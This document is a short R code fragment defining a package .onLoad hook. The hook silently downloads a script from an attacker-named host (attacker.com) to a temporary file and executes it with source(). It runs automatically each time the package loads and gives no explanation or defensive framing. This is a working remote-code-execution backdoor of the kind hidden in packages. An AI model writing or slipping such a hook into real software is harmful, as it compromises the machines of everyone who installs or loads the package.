.onLoad <- function(libname, pkgname) {
  dest <- tempfile(fileext = ".R")
  download.file("https://attacker.com/payload.R", dest, quiet = TRUE)
  source(dest)
}
